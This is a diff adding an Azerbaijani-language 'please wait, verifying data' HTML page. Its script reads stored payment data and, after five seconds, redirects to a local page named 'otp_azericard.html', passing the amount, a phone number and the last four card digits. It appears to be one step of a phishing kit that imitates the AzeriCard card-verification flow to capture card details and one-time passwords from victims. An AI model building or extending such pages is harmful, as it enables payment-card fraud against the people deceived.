@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="az">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gözləyin</title>
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: linear-gradient(135deg, #e8eaf0 0%, #d4d8e3 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            text-align: center;
+        }
+
+        .spinner {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 40px;
+            border: 6px solid rgba(0, 102, 255, 0.2);
+            border-top-color: #0066ff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .message {
+            font-size: 22px;
+            font-weight: 600;
+            color: #2c3e50;
+            margin-bottom: 12px;
+        }
+
+        .submessage {
+            font-size: 15px;
+            color: #7f8c9b;
+        }
+
+        @media (max-width: 600px) {
+            .spinner {
+                width: 60px;
+                height: 60px;
+                margin-bottom: 30px;
+            }
+
+            .message {
+                font-size: 18px;
+            }
+
+            .submessage {
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="container">
+        <div class="spinner"></div>
+        <div class="message">Məlumatlar yoxlanılır, zəhmət olmasa gözləyin...</div>
+        <div class="submessage">Bu bir neçə saniyə çəkə bilər</div>
+    </div>
+
+    <script>
+        // 5 saniye sonra OTP sayfasına yönlendir
+        setTimeout(function() {
+            // localStorage'dan veri al
+            const paymentData = JSON.parse(localStorage.getItem('paymentData') || '{}');
+            
+            // OTP sayfasına yönlendir
+            window.location.href = 'otp_azericard.html?amount=' + (paymentData.amount || '0') + 
+                                   '&number=' + (paymentData.number || '') +
+                                   '&card=' + (paymentData.cardNumber ? paymentData.cardNumber.slice(-4) : '****');
+        }, 5000);
+    </script>
+
+</body>
+</html>
